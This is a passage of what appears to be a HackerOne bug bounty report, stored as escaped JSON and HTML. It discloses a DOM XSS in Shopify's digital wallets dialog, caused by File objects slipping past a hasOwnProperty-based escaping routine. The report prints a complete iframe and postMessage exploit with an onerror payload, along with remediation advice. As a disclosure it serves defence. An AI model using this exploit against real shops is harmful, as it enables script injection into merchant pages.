class=\"s2\"\u003e\u0026lt;/span\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e        \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;td class=\u0026quot;product__quantity visually-hidden\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eamount\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e      \u0026lt;td class=\u0026quot;product__status product__status--sold-out\u0026quot;\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emessage\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/td\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;/tr\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e  \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd again we can verify this assumption by testing it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ewindow.postMessage({\n  type: \u0026quot;DigitalWalletsDialog:change\u0026quot;,\n  digitalWalletsDialog: true,\n  payload: {\n    title: \u0026quot;placeholder\u0026quot;,\n    button: \u0026quot;placeholder\u0026quot;,\n    lineItems: [{\n      name: \u0026quot;product\u0026quot;,\n      amount: \u0026quot;$13.37\u0026quot;,\n      message: \u0026quot;added to cart\u0026quot;\n    }],\n  },\n}, \u0026quot;*\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd we get the expected result:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-05-23_at_2.24.34_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.24.34_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.24.34_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050508Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026amp;X-Amz-Signature=c428e3e29ece366aef3be2e55a21a950bf62e04efb15e9c8909299e951175af2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.24.34_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.24.34_AM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050508Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7JztYb6rdSeSRyzKgf4LxEu42JMoyPyy0VqqdaIdaW%2F5Oe%2FZcBqKJkPjfrnsLv1E3Cttn6QZ2fsMawdDGLyKyEEvAx6LbD4TYD1QOy0YJIw6j32Nt3V4psvzyU384FsJYLymiqMGAqTzIuUS4QNvTcHn%2BFoOZvS%2F06fP5YWj%2BxpW%2BELDyBb5CFIWqKXYmkW%2BPv4IxFiMVfFF4KM80ZKVGfyJ7nRaRwvjM5YUJYHOlvXjFuPBSC3IYIgEZYlopEqTolZ1OQ2zbi1yDB%2FWl1rx7i7cbCVK6zJwPdLcPRBOa7jlMN0jlHdNPzjyKxdEaNBy7Cyflyw%2FZCl7X1dB7yuSBF8YK2st4h%2FZchseLh%2BjukipjtpVl5nDjO8BSu5evt1V1lFzADomlTKShrSgjmej1gvXmULpbdNuEwc3vMl328MfuwtHHSSvzZo5xxP0U1cq9fhM0Ztcea1ZRpQDZR4DB1jRqdjeMIXNuuwv3G7Uotj1VrvA87zW9Og6gQ9VN7fQSdOpurQFAV2WvRMIuSqv8FOusB%2B%2BEh7xquKUpKrZEfrLl0yLcAZyezk5OlnVLaoE%2BCU7%2F1YWDwq4fJ%2Fzqx58r%2Ffgzx%2FRuGFLAoCPIl7GI47ntqpCuRo5kjknXh3Vhm0Ds%2B9y0Uo9mgVKhl6XjEqADeRJOm5JpIvTZkPibWah%2FFXooiOsIWnpbe3xZbkrh62wdx0iVuonbBNy6Z0vYXXREkzeNyKh%2Fx0i0DwAehfYiLehqkIm1GqvDnaSiQ0dTRzOsrEnXwNhRtDRaBDDLvFXHGy3Xm8ucb70jki0U1otEIUfIG%2Fnfsrs7zhSOcLfi6%2B4aytuy%2FrSFLmVnwIpfIzQ%3D%3D\u0026amp;X-Amz-Signature=c428e3e29ece366aef3be2e55a21a950bf62e04efb15e9c8909299e951175af2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"technical-details\"\u003eTechnical Details\u003c/h1\u003e\n\n\u003cp\u003eSo now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...\u003cbr\u003e\nThe main function we\u0026#39;re interested in here is the \u003ccode\u003eu\u003c/code\u003e which handles escaping all attributes on the payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eidx\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eVe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eescapeHtml\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eidx\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow if we assume that \u003ccode\u003eescapeHtml\u003c/code\u003e function does not have any issues/bypasses, we can observe something interesting: The function does not create a \u0026quot;new\u0026quot; escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to \u003ccode\u003ehasOwnProperty\u003c/code\u003e it will not be escaped. We can test this locally:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// Expected to fail:\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;b\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emessage\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026quot;\u0026amp;#39;\u0026amp;quot;\u0026amp;lt;b\u0026amp;gt;\\\u0026quot;\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// Bypassed:\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;b\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026quot;\u0026#39;\u0026quot;\u0026lt;b\u0026gt;\\\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is great, but in practice we\u0026#39;re limited to only a few properties that are actually accessed by the HTML template:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003evariant\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ename\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eimage\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emessage\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAdditionally, we\u0026#39;re limited to only objects which can be passed over postMessage, for example we can\u0026#39;t use the \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FError\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eError\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e object which already has a \u003ccode\u003emessage\u003c/code\u003e attribute. The list of allowed objects for postMessage is defined as part of the \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FStructured_clone_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHTML5 structured clone algorithm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAfter a bit of experimentation with each of them, it looks like the \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FFile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFile\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e object is perfect for this exploit as it has a read-only \u003ccode\u003ename\u003c/code\u003e property which is used by our template. We can test it out like so:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econtrolledvalue\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026quot;controlledvalue\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ename\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// false\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePutting this all together with an iframe to make it clean we get the final exploit:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eshop\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprompt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eEnter a Target Shop URL:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://bored-engineering-whitehat-2.myshopify.com\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eframe\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eiframe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esrc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eshop\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/1337/digital_wallets/dialog`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estyle\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edisplay\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003enone\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eframe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econtentWindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n    \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eDigitalWalletsDialog:change\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003edigitalWalletsDialog\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003ebutton\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"na\"\u003elineItems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;img src=xx: onerror=alert(document.domain)\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)],\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eframe\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"exploitability\"\u003eExploitability\u003c/h1\u003e\n\n\u003cp\u003eAs shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the \u003ccode\u003e/:id/digital_wallets/dialog\u003c/code\u003e route which is not under \u003ccode\u003e/admin\u003c/code\u003e, though at this point in time it would be trivial to escalate that access to the \u003ccode\u003e/admin\u003c/code\u003e route. \u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;ve hosted a simple PoC at \u003ca href=\"/redirect?url=https%3A%2F%2Fattackerdoma.in%2Fde43386b-cbea-4427-89f7-90e269b9b72a.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"remediation\"\u003eRemediation\u003c/h1\u003e\n\n\u003cp\u003eThis issue could be fixed either within the \u003ccode\u003eu\u003c/code\u003e function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running \u003ccode\u003eJSON.parse\u003c/code\u003e on the message, and exiting the handling if parsing fails. \u003c/p\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":187323,"file_name":"Screen_Shot_2017-05-23_at_2.18.44_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/187/323/a9ce0d995d209aa7009a5b3ab3951b2173c63835/Screen_Shot_2017-05-23_at_2.18.44_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-05-23_at_2.18.44_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-05-23_at_2.18.44_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2UMPB2FX%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050508Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEq9neBunEjsdY7f8cNZfYtjkYnfx7sYXIBk82UycrktAiEA5w10R4CJv%2FQIiYTXv1ZP8q%2BbScvvzy7qwcG%2BmPmKCXMqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKX6CTSGAGf6Bt5yHyqRA9qW1WRQYe7